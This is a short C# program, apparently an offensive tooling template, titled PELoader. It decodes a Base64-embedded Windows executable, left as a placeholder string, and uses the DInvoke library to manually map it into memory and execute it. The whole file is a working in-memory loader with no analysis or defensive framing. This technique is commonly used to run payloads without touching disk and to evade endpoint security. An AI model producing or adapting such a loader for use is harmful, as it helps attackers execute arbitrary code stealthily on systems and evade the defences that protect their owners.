using System;
// install nuget package DInvoke + Fody
namespace PELoader
{
    class Program
    {
        static void Main()
        {

            string peAsString = "BASE64EncodedBinary";

            byte[] unpacked = System.Convert.FromBase64String(peAsString);
            DInvoke.Data.PE.PE_MANUAL_MAP mapPE = DInvoke.ManualMap.Map.MapModuleToMemory(unpacked);
            DInvoke.DynamicInvoke.Generic.CallMappedPEModule(mapPE.PEINFO, mapPE.ModuleBase);
            Console.ReadLine();
        }
    }
}
